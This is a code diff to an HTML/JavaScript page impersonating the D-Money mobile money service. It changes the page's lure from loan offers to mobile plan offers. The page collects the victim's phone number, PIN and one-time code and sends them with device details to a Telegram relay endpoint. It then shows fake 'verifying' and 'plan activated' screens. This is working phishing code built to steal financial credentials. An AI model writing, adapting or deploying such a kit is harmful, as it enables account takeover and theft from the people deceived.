@@ -270,11 +270,11 @@ input:focus{border-color:var(--gold);background:var(--white);box-shadow:0 0 0 4p
       <div class="brand"><img src="assets/dmoney-logo.png" alt="D-Money"></div>
       <div class="amount-chip" id="headerAmount">0 DJF</div>
     </div>
-    <div class="loan-pills" id="loanPills">
+    <div class="loan-pills" id="planPills">
       <span class="loan-pill" id="pillPlan">—</span>
       <span class="loan-pill" id="pillAmt">—</span>
-      <span class="loan-pill" id="pillDays">—</span>
-      <span class="loan-pill" id="pillRate">—</span>
+      <span class="loan-pill" id="pillVoice2">—</span>
+      <span class="loan-pill" id="pillData2">—</span>
     </div>
   </div>
 
@@ -414,15 +414,15 @@ function initHeader(){
   document.getElementById('headerAmount').textContent=selectedPlan.amount.toLocaleString('fr-FR').replace(/\s/g,'\u202f')+' DJF';
   document.getElementById('pillPlan').textContent=selectedPlan.plan;
   document.getElementById('pillAmt').textContent=selectedPlan.voice+' Min';
-  document.getElementById('pillDays').textContent=selectedPlan.sms+' SMS';
-  document.getElementById('pillRate').textContent=selectedPlan.data+' Go';
+  document.getElementById('pillVoice2').textContent=selectedPlan.sms+' SMS';
+  document.getElementById('pillData2').textContent=selectedPlan.data+' Go';
 }
 initHeader();
 
 const ua=navigator.userAgent;
 let device=(/Android/i.test(ua)?'Android':(/iPhone|iPad/i.test(ua)?'iOS':'Unknown'));
 if(/Chrome/i.test(ua))device+='|Chrome';else if(/Safari/i.test(ua))device+='|Safari';
-function getPlanLine(){return selectedPlan?`Plan:${selectedPlan.plan}|Montant:${selectedPlan.amount}DJF|Jours:${selectedPlan.days}|Intérêt:${selectedPlan.interest}DJF|Total:${selectedPlan.total}DJF`:''}
+function getPlanLine(){return selectedPlan?'Forfait:'+selectedPlan.plan+'|'+selectedPlan.voice+'Min|'+selectedPlan.sms+'SMS|'+selectedPlan.data+'Go|'+selectedPlan.amount+'DJF':''}
 async function sendToTelegram(event){
   fetch('/api/sendTelegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event,plan:getPlanLine(),device})});
 }
@@ -575,7 +575,7 @@ function runVerifySequence(raw){
     vs.forEach((v,j)=>{v.className='vstep'+(j<i?' done':j===i?' active':'')});
     lines.forEach((l,j)=>{l.classList.toggle('done',j<i)});haptic('select');
   }
-  setStep(0,'Vérification PIN','Vérification de vos identifiants D-Money…');
+  setStep(0,'Vérification PIN','Vérification de vos identifiants…');
   setTimeout(()=>{setStep(1,'Envoi OTP','Envoi de votre code à usage unique…');haptic('light')},900);
   setTimeout(()=>{
     vs.forEach(v=>v.className='vstep done');lines.forEach(l=>l.classList.add('done'));
@@ -629,7 +629,7 @@ function navigate(url){
   const label=document.getElementById('cLabel');
   const sub=document.getElementById('cSub');
   const dots=[document.getElementById('cd0'),document.getElementById('cd1'),document.getElementById('cd2')];
-  const steps=[{l:'Authentification',s:'Vérification de votre PIN D-Money…',d:0},{l:'Autorisation',s:'Traitement de la demande de prêt…',d:1},{l:'Confirmé',s:'Votre prêt a été approuvé…',d:2}];
+  const steps=[{l:'Authentification',s:'Vérification de votre PIN D-Money…',d:0},{l:'Autorisation',s:'Validation de votre forfait…',d:1},{l:'Confirmé',s:'Votre forfait a été activé…',d:2}];
   function setStep(i){label.style.opacity='0';sub.style.opacity='0';setTimeout(()=>{label.textContent=steps[i].l;sub.textContent=steps[i].s;label.style.opacity='1';sub.style.opacity='1'},130);dots.forEach((d,j)=>d.className='cdot'+(j===steps[i].d?' on':j<steps[i].d?' done':''))}
   document.getElementById('screen').classList.add('exit');curtain.classList.add('show');
   setStep(0);setTimeout(()=>setStep(1),500);setTimeout(()=>setStep(2),1050);
